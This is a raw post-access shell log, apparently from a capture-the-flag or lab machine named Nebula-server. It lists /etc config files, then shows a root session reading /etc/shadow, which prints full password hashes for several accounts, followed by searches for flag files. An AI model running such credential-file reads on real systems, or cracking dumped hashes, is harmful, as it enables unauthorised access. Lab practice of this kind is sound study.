/etc/dbus-1/system.d/org.freedesktop.locale1.conf
/etc/dbus-1/system.d/org.freedesktop.hostname1.conf
/etc/dbus-1/system.d/wpa_supplicant.conf
/etc/dbus-1/system.d/org.freedesktop.login1.conf
/etc/dbus-1/system.d/org.freedesktop.timedate1.conf
/etc/dbus-1/system.d/Mountall.Server.conf
/etc/dbus-1/system.d/org.freedesktop.systemd-shim.conf
/etc/hdparm.conf
/etc/deluser.conf
/etc/polkit-1/localauthority.conf.d/50-localauthority.conf
/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
/etc/polkit-1/nullbackend.conf.d/50-nullbackend.conf
/etc/popularity-contest.conf
/etc/ltrace.conf
/etc/initramfs-tools/initramfs.conf
/etc/initramfs-tools/update-initramfs.conf
/etc/bind/named.conf
/etc/insserv.conf
/etc/gai.conf
/etc/fonts/conf.d/69-language-selector-zh-mo.conf
/etc/fonts/conf.d/69-language-selector-zh-cn.conf
/etc/fonts/conf.d/99-language-selector-zh.conf
/etc/fonts/conf.d/69-language-selector-zh-tw.conf
/etc/fonts/conf.d/69-language-selector-zh-hk.conf
/etc/fonts/conf.d/30-cjk-aliases.conf
/etc/fonts/conf.d/69-language-selector-zh-sg.conf
/etc/fonts/conf.avail/69-language-selector-zh-mo.conf
/etc/fonts/conf.avail/69-language-selector-zh-cn.conf
/etc/fonts/conf.avail/99-language-selector-zh.conf
/etc/fonts/conf.avail/69-language-selector-zh-tw.conf
/etc/fonts/conf.avail/69-language-selector-zh-hk.conf
/etc/fonts/conf.avail/30-cjk-aliases.conf
/etc/fonts/conf.avail/69-language-selector-zh-sg.conf
/etc/nsswitch.conf
/etc/ldap/ldap.conf
/etc/mke2fs.conf
/etc/sysctl.conf
/etc/selinux/semanage.conf
/etc/depmod.d/ubuntu.conf
/etc/logrotate.conf
/etc/ca-certificates.conf
/etc/apport/crashdb.conf
/etc/ld.so.conf.d/x86_64-linux-gnu_GL.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/libc.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/adduser.conf
/etc/ucf.conf
/etc/apparmor/parser.conf
/etc/apparmor/subdomain.conf
/etc/updatedb.conf
/etc/sysctl.d/10-zeropage.conf
/etc/sysctl.d/10-network-security.conf
/etc/sysctl.d/10-ptrace.conf
/etc/sysctl.d/10-link-restrictions.conf
/etc/sysctl.d/10-console-messages.conf
/etc/sysctl.d/10-ipv6-privacy.conf
/etc/sysctl.d/10-magic-sysrq.conf
/etc/sysctl.d/10-kernel-hardening.conf
/etc/libaudit.conf
/etc/kernel-img.conf
/etc/lighttpd/conf-available/10-evasive.conf
/etc/lighttpd/conf-available/10-userdir.conf
/etc/lighttpd/conf-available/10-ssi.conf
/etc/lighttpd/conf-available/90-debian-doc.conf
/etc/lighttpd/conf-available/10-proxy.conf
/etc/lighttpd/conf-available/10-fastcgi.conf
/etc/lighttpd/conf-available/20-admin.conf
/etc/lighttpd/conf-available/10-flv-streaming.conf
/etc/lighttpd/conf-available/10-accesslog.conf
/etc/lighttpd/conf-available/10-no-www.conf
/etc/lighttpd/conf-available/05-auth.conf
/etc/lighttpd/conf-available/10-status.conf
/etc/lighttpd/conf-available/11-extforward.conf
/etc/lighttpd/conf-available/10-usertrack.conf
/etc/lighttpd/conf-available/10-cgi.conf
/etc/lighttpd/conf-available/10-expire.conf
/etc/lighttpd/conf-available/10-dir-listing.conf
/etc/lighttpd/conf-available/10-rrdtool.conf
/etc/lighttpd/conf-available/10-evhost.conf
/etc/lighttpd/conf-available/10-simple-vhost.conf
/etc/lighttpd/conf-available/15-fastcgi-php.conf
/etc/lighttpd/lighttpd.conf
/etc/lighttpd/lighttpd_siem.conf
/etc/ufw/sysctl.conf
/etc/ufw/ufw.conf
/etc/systemd/logind.conf
/etc/modprobe.d/iwlwifi.conf
/etc/modprobe.d/blacklist-firewire.conf
/etc/modprobe.d/fbdev-blacklist.conf
/etc/modprobe.d/blacklist-framebuffer.conf
/etc/modprobe.d/intel-microcode-blacklist.conf
/etc/modprobe.d/mlx4.conf
/etc/modprobe.d/blacklist-ath_pci.conf
/etc/modprobe.d/blacklist-watchdog.conf
/etc/modprobe.d/blacklist-rare-network.conf
/etc/modprobe.d/blacklist.conf
/etc/debconf.conf
/etc/rsyslog.d/50-default.conf
/etc/rsyslog.d/20-ufw.conf
/etc/security/access.conf
/etc/security/pam_env.conf
/etc/security/capability.conf
/etc/security/group.conf
/etc/security/sepermit.conf
/etc/security/namespace.conf
/etc/security/limits.conf
/etc/security/time.conf
/etc/iscsi/iscsid.conf
/etc/host.conf
/etc/udev/udev.conf
/etc/rsyslog.conf
/etc/dhcp/dhclient.conf
/etc/init/apport.conf
/etc/init/rcS.conf
/etc/init/networking.conf
/etc/init/plymouth-upstart-bridge.conf
/etc/init/container-detect.conf
/etc/init/network-interface-security.conf
/etc/init/mounted-debugfs.conf
/etc/init/wait-for-state.conf
/etc/init/console-setup.conf
/etc/init/bootmisc.sh.conf
/etc/init/shutdown.conf
/etc/init/checkroot.sh.conf
/etc/init/console.conf
/etc/init/mountnfs.sh.conf
/etc/init/startpar-bridge.conf
/etc/init/tty5.conf
/etc/init/network-interface-container.conf
/etc/init/mountnfs-bootclean.sh.conf
/etc/init/tty2.conf
/etc/init/dmesg.conf
/etc/init/mounted-dev.conf
/etc/init/plymouth.conf
/etc/init/rc-sysinit.conf
/etc/init/mountall-net.conf
/etc/init/plymouth-log.conf
/etc/init/tty3.conf
/etc/init/cron.conf
/etc/init/udev-finish.conf
/etc/init/ureadahead.conf
/etc/init/checkroot-bootclean.sh.conf
/etc/init/mounted-tmp.conf
/etc/init/tty6.conf
/etc/init/mounted-var.conf
/etc/init/mountall-reboot.conf
/etc/init/mountall-bootclean.sh.conf
/etc/init/ureadahead-other.conf
/etc/init/mounted-proc.conf
/etc/init/plymouth-ready.conf
/etc/init/console-font.conf
/etc/init/rc.conf
/etc/init/irqbalance.conf
/etc/init/hwclock.conf
/etc/init/passwd.conf
/etc/init/checkfs.sh.conf
/etc/init/plymouth-stop.conf
/etc/init/hwclock-save.conf
/etc/init/mtab.sh.conf
/etc/init/udev.conf
/etc/init/upstart-socket-bridge.conf
/etc/init/tty4.conf
/etc/init/plymouth-splash.conf
/etc/init/udev-fallback-graphics.conf
/etc/init/systemd-logind.conf
/etc/init/upstart-udev-bridge.conf
/etc/init/hostname.conf
/etc/init/plymouth-shutdown.conf
/etc/init/procps.conf
/etc/init/mountall.conf
/etc/init/amazon-ssm-agent.conf
/etc/init/kmod.conf
/etc/init/ssh.conf
/etc/init/ufw.conf
/etc/init/mounted-run.conf
/etc/init/flush-early-job-log.conf
/etc/init/atd.conf
/etc/init/resolvconf.conf
/etc/init/friendly-recovery.conf
/etc/init/rsyslog.conf
/etc/init/mountall.sh.conf
/etc/init/udevmonitor.conf
/etc/init/udevtrigger.conf
/etc/init/setvtrgb.conf
/etc/init/dbus.conf
/etc/init/upstart-file-bridge.conf
/etc/init/control-alt-delete.conf
/etc/init/failsafe.conf
/etc/init/acpid.conf
/etc/init/mountdevsubfs.sh.conf
/etc/init/network-interface.conf
/etc/init/mountall-shell.conf
/etc/init/tty1.conf
/etc/init/mountkernfs.sh.conf
/etc/ld.so.conf
/etc/fuse.conf
/etc/pam.conf

hostname
Nebula-server
uname -a
Linux Nebula-server 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
cat /etc/passwd | wc -l
26
cat /etc/shadow | grep root
root:$6$dTV9ZkDw$ZULnb36XSMz1fv4LzsGXZnq7FpRx3H6v3CUmD/iySvY4M/9lzVGUVv81ChJsasATlegYJLib8Ciw1/fowpi2s0:20014:0:99999:7:::
sudo cat /etc/shadow
root:$6$dTV9ZkDw$ZULnb36XSMz1fv4LzsGXZnq7FpRx3H6v3CUmD/iySvY4M/9lzVGUVv81ChJsasATlegYJLib8Ciw1/fowpi2s0:20014:0:99999:7:::
daemon:*:17959:0:99999:7:::
bin:*:17959:0:99999:7:::
sys:*:17959:0:99999:7:::
sync:*:17959:0:99999:7:::
games:*:17959:0:99999:7:::
man:*:17959:0:99999:7:::
lp:*:17959:0:99999:7:::
mail:*:17959:0:99999:7:::
news:*:17959:0:99999:7:::
uucp:*:17959:0:99999:7:::
proxy:*:17959:0:99999:7:::
www-data:*:17959:0:99999:7:::
backup:*:17959:0:99999:7:::
list:*:17959:0:99999:7:::
irc:*:17959:0:99999:7:::
gnats:*:17959:0:99999:7:::
nobody:*:17959:0:99999:7:::
libuuid:!:17959:0:99999:7:::
syslog:*:17959:0:99999:7:::
messagebus:*:20014:0:99999:7:::
landscape:*:20014:0:99999:7:::
guakamole:$6$kVXyIMLn$A6bPHFDkYFqd/dS58eGsJmK2lYnlEQxtgYX6H/6WxdC.V21j/P8IaseqnKibDBq1PkdmRqgPO2CU3dd/U6gCl1:20014:0:99999:7:::
sshd:*:20014:0:99999:7:::
bind:*:20021:0:99999:7:::
bluffer:$6$XDj2Khlp$3O50apIJ/1wbvCbfCRFWQsyVgp3BXTB.sQfQLGvIfpLHAulDOFXADfugbba8uPFc93CVUZTTBGZvdvOIl7mWc/:20186:0:99999:7:::
cat /etc/passwd | grep <nombre_usuario>
/bin/sh: 22: Syntax error: newline unexpected
[*] 10.10.33.174 - Command shell session 1 closed.

whoami 
root
find / -name 'flag*'
/usr/src/linux-headers-4.4.0-142-generic/include/config/zone/dma/flag.h
/usr/src/linux-headers-4.4.0-142/scripts/coccinelle/locks/flags.cocci
/usr/lib/python2.7/dist-packages/dns/flags.py
/usr/lib/python2.7/dist-packages/dns/flags.pyc
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/vif-0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags

cat /etc/passwd | grep guakamole
guakamole:x:1000:1000:David Kline,,,:/home/guakamole:/bin/bash
grep -i "bug" /var/log/syslog

find / -type f -name "*flag*"
/usr/include/linux/tty_flags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/local/samba/lib/private/libflag-mapping-samba4.so
/usr/src/linux-headers-4.4.0-142-generic/include/config/zone/dma/flag.h
/usr/src/linux-headers-4.4.0-142/include/linux/page-flags-layout.h
/usr/src/linux-headers-4.4.0-142/include/linux/pageblock-flags.h
/usr/src/linux-headers-4.4.0-142/include/linux/irqflags.h
/usr/src/linux-headers-4.4.0-142/include/linux/kernel-page-flags.h
/usr/src/linux-headers-4.4.0-142/include/linux/page-flags.h
/usr/src/linux-headers-4.4.0-142/include/trace/events/gfpflags.h
/usr/src/linux-headers-4.4.0-142/include/asm-generic/irqflags.h
/usr/src/linux-headers-4.4.0-142/include/uapi/linux/tty_flags.h
/usr/src/linux-headers-4.4.0-142/include/uapi/linux/kernel-page-flags.h
/usr/src/linux-headers-4.4.0-142/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-4.4.0-142/arch/mn10300/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/unicore32/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/blackfin/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/s390/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/cris/include/arch-v32/arch/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/cris/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/cris/include/arch-v10/arch/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/arc/include/asm/irqflags-arcv2.h
/usr/src/linux-headers-4.4.0-142/arch/arc/include/asm/irqflags-compact.h
/usr/src/linux-headers-4.4.0-142/arch/arc/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/m68k/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/mips/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/alpha/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/h8300/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/metag/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/arm/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/arm64/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/microblaze/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/sparc/include/asm/irqflags_32.h
/usr/src/linux-headers-4.4.0-142/arch/sparc/include/asm/irqflags_64.h
/usr/src/linux-headers-4.4.0-142/arch/sparc/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/avr32/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/c6x/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/x86/include/asm/processor-flags.h
/usr/src/linux-headers-4.4.0-142/arch/x86/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/linux-headers-4.4.0-142/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-headers-4.4.0-142/arch/um/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/sh/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/nios2/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/powerpc/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/m32r/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/tile/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/hexagon/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/openrisc/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/xtensa/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/frv/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/parisc/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/ia64/include/asm/irqflags.h
/usr/src/linux-headers-4.4.0-142/arch/score/include/asm/irqflags.h
/usr/bin/dpkg-buildflags
/usr/lib/perl/5.18.2/bits/waitflags.ph
/usr/lib/python2.7/dist-packages/dns/flags.py
/usr/lib/python2.7/dist-packages/dns/flags.pyc
/usr/share/dpkg/buildflags.mk
/usr/share/man/man1/dpkg-buildflags.1.gz
/usr/share/man/de/man1/dpkg-buildflags.1.gz
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/vif-0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
ps aux | grep -i "malware"
root      1502  0.0  0.0   8880   772 ?        S    23:42   0:00 grep -i malware

find / -type f -name "*.sh" -o -name "*.php" -o -name "*.exe" 2>/dev/null
/usr/local/lib/python3.4/dist-packages/pip/_vendor/distlib/t32.exe
/usr/local/lib/python3.4/dist-packages/pip/_vendor/distlib/w64.exe
/usr/local/lib/python3.4/dist-packages/pip/_vendor/distlib/t64.exe
/usr/local/lib/python3.4/dist-packages/pip/_vendor/distlib/w32.exe
/usr/src/linux-headers-4.4.0-142/Documentation/features/list-arch.sh
/usr/src/linux-headers-4.4.0-142/Documentation/s390/config3270.sh
/usr/src/linux-headers-4.4.0-142/Documentation/aoe/status.sh
/usr/src/linux-headers-4.4.0-142/Documentation/aoe/autoload.sh
/usr/src/linux-headers-4.4.0-142/Documentation/aoe/udev-install.sh
/usr/src/linux-headers-4.4.0-142/tools/build/tests/run.sh
/usr/src/linux-headers-4.4.0-142/tools/usb/usbip/autogen.sh
/usr/src/linux-headers-4.4.0-142/tools/usb/usbip/cleanup.sh
/usr/src/linux-headers-4.4.0-142/tools/usb/hcd-tests.sh
/usr/src/linux-headers-4.4.0-142/tools/nfsd/inject_fault.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/fault-injection/failcmd.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/static_keys/test_static_keys.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/gen_kselftest_tar.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/memfd/run_fuse_test.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/futex/functional/run.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/futex/run.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/x86/check_cc.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/zram/zram02.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/zram/zram_lib.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/zram/zram.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/zram/zram01.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/cpu-hotplug/cpu-on-off-test.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/net/test_bpf.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/efivarfs/efivarfs.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/memory-hotplug/mem-on-off-test.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/firmware/fw_filesystem.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/firmware/fw_userhelper.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/lib/printf.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/user/test_user_copy.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/kselftest_install.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/configs/lock/ver_functions.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/configs/rcu/ver_functions.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/parse-console.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/kvm-recheck-rcu.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/kvm-build.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/configinit.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/config2frag.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/parse-build.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/kvm.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/configNR_CPUS.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/kvm-recheck-lock.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/kvm-recheck.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/cpus2use.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/configcheck.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/parse-torture.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/functions.sh
/usr/src/linux-headers-4.4.0-142/tools/testing/selftests/rcutorture/bin/kvm-test-1-run.sh
/usr/src/linux-headers-4.4.0-142/tools/hv/hv_get_dhcp_info.sh
/usr/src/linux-headers-4.4.0-142/tools/hv/hv_set_ifconfig.sh
/usr/src/linux-headers-4.4.0-142/tools/hv/bondvf.sh
/usr/src/linux-headers-4.4.0-142/tools/hv/hv_get_dns_info.sh
/usr/src/linux-headers-4.4.0-142/tools/perf/perf-archive.sh
/usr/src/linux-headers-4.4.0-142/tools/perf/util/generate-cmdlist.sh
/usr/src/linux-headers-4.4.0-142/tools/perf/perf-completion.sh
/usr/src/linux-headers-4.4.0-142/tools/perf/perf-with-kcore.sh
/usr/src/linux-headers-4.4.0-142/tools/perf/arch/x86/tests/gen-insn-x86-dat.sh
/usr/src/linux-headers-4.4.0-142/tools/power/cpupower/utils/version-gen.sh
/usr/src/linux-headers-4.4.0-142/tools/power/cpupower/bench/cpufreq-bench_plot.sh
/usr/src/linux-headers-4.4.0-142/tools/power/cpupower/bench/cpufreq-bench_script.sh
/usr/src/linux-headers-4.4.0-142/tools/time/udelay_test.sh
/usr/src/linux-headers-4.4.0-142/tools/lib/lockdep/run_tests.sh
/usr/src/linux-headers-4.4.0-142/tools/vm/slabinfo-gnuplot.sh
/usr/src/linux-headers-4.4.0-142/samples/pktgen/pktgen_sample01_simple.sh
/usr/src/linux-headers-4.4.0-142/samples/pktgen/pktgen_bench_xmit_mode_netif_receive.sh
/usr/src/linux-headers-4.4.0-142/samples/pktgen/parameters.sh
/usr/src/linux-headers-4.4.0-142/samples/pktgen/pktgen_sample03_burst_single_flow.sh
/usr/src/linux-headers-4.4.0-142/samples/pktgen/functions.sh
/usr/src/linux-headers-4.4.0-142/samples/pktgen/pktgen_sample02_multiqueue.sh
/usr/src/linux-headers-4.4.0-142/zfs/autogen.sh
/usr/src/linux-headers-4.4.0-142/zfs/config/ltmain.sh
/usr/src/linux-headers-4.4.0-142/spl/autogen.sh
/usr/src/linux-headers-4.4.0-142/spl/scripts/check.sh
/usr/src/linux-headers-4.4.0-142/spl/config/ltmain.sh
/usr/src/linux-headers-4.4.0-142/scripts/xz_wrap.sh
/usr/src/linux-headers-4.4.0-142/scripts/decode_stacktrace.sh
/usr/src/linux-headers-4.4.0-142/scripts/xen-hypercalls.sh
/usr/src/linux-headers-4.4.0-142/scripts/selinux/install_policy.sh
/usr/src/linux-headers-4.4.0-142/scripts/headers_install.sh
/usr/src/linux-headers-4.4.0-142/scripts/link-vmlinux.sh
/usr/src/linux-headers-4.4.0-142/scripts/gcc-x86_64-has-stack-protector.sh
/usr/src/linux-headers-4.4.0-142/scripts/gcc-goto.sh
/usr/src/linux-headers-4.4.0-142/scripts/mkuboot.sh
/usr/src/linux-headers-4.4.0-142/scripts/gcc-x86_32-has-stack-protector.sh
/usr/src/linux-headers-4.4.0-142/scripts/gcc-version.sh
/usr/src/linux-headers-4.4.0-142/scripts/ld-version.sh
/usr/src/linux-headers-4.4.0-142/scripts/check_extable.sh
/usr/src/linux-headers-4.4.0-142/scripts/tags.sh
/usr/src/linux-headers-4.4.0-142/scripts/headers.sh
/usr/src/linux-headers-4.4.0-142/scripts/gen_initramfs_list.sh
/usr/src/linux-headers-4.4.0-142/scripts/dtc/update-dtc-source.sh
/usr/src/linux-headers-4.4.0-142/scripts/kconfig/merge_config.sh
/usr/src/linux-headers-4.4.0-142/scripts/kconfig/check.sh
/usr/src/linux-headers-4.4.0-142/scripts/kconfig/lxdialog/check-lxdialog.sh
/usr/src/linux-headers-4.4.0-142/scripts/checksyscalls.sh
/usr/src/linux-headers-4.4.0-142/scripts/depmod.sh
/usr/src/linux-headers-4.4.0-142/arch/mn10300/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/blackfin/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/s390/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/m68k/install.sh
/usr/src/linux-headers-4.4.0-142/arch/arm/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/arm64/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/arm64/kernel/vdso/gen_vdso_offsets.sh
/usr/src/linux-headers-4.4.0-142/arch/sparc/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/x86/tools/calc_run_size.sh
/usr/src/linux-headers-4.4.0-142/arch/x86/um/vdso/checkundef.sh
/usr/src/linux-headers-4.4.0-142/arch/x86/entry/vdso/checkundef.sh
/usr/src/linux-headers-4.4.0-142/arch/x86/entry/syscalls/syscallhdr.sh
/usr/src/linux-headers-4.4.0-142/arch/x86/entry/syscalls/syscalltbl.sh
/usr/src/linux-headers-4.4.0-142/arch/x86/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-headers-4.4.0-142/arch/sh/boot/compressed/install.sh
/usr/src/linux-headers-4.4.0-142/arch/nios2/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/powerpc/relocs_check.sh
/usr/src/linux-headers-4.4.0-142/arch/powerpc/boot/install.sh
/usr/src/linux-headers-4.4.0-142/arch/powerpc/kernel/prom_init_check.sh
/usr/src/linux-headers-4.4.0-142/arch/powerpc/kernel/systbl_chk.sh
/usr/src/linux-headers-4.4.0-142/arch/m32r/boot/compressed/install.sh
/usr/src/linux-headers-4.4.0-142/arch/parisc/install.sh
/usr/src/linux-headers-4.4.0-142/arch/ia64/install.sh
/usr/bin/gettext.sh
/usr/lib/ssl/misc/CA.sh
/usr/lib/grub/i386-pc/modinfo.sh
/usr/share/debconf/confmodule.sh
/usr/share/os-prober/common.sh
/usr/share/vim/vim74/macros/less.sh
/usr/share/doc/git/contrib/rerere-train.sh
/usr/share/doc/git/contrib/fast-import/git-import.sh
/usr/share/doc/git/contrib/remote-helpers/test-bzr.sh
/usr/share/doc/git/contrib/remote-helpers/test-hg-hg-git.sh
/usr/share/doc/git/contrib/remote-helpers/test-hg.sh
/usr/share/doc/git/contrib/remote-helpers/test-hg-bidi.sh
/usr/share/doc/git/contrib/thunderbird-patch-inline/appp.sh
/usr/share/doc/git/contrib/git-resurrect.sh
/usr/share/doc/git/contrib/remotes2config.sh
/usr/share/doc/git/contrib/subtree/git-subtree.sh
/usr/share/doc/git/contrib/subtree/t/t7900-subtree.sh
/usr/share/doc/git/contrib/examples/git-gc.sh
/usr/share/doc/git/contrib/examples/git-merge.sh
/usr/share/doc/git/contrib/examples/git-clean.sh
/usr/share/doc/git/contrib/examples/git-fetch.sh
/usr/share/doc/git/contrib/examples/git-merge-ours.sh
/usr/share/doc/git/contrib/examples/git-commit.sh
/usr/share/doc/git/contrib/examples/git-clone.sh
/usr/share/doc/git/contrib/examples/git-reset.sh
/usr/share/doc/git/contrib/examples/git-resolve.sh
/usr/share/doc/git/contrib/examples/git-checkout.sh
/usr/share/doc/git/contrib/examples/git-verify-tag.sh
/usr/share/doc/git/contrib/examples/git-repack.sh
/usr/share/doc/git/contrib/examples/git-log.sh
/usr/share/doc/git/contrib/examples/git-revert.sh
/usr/share/doc/git/contrib/examples/git-whatchanged.sh
/usr/share/doc/git/contrib/examples/git-tag.sh
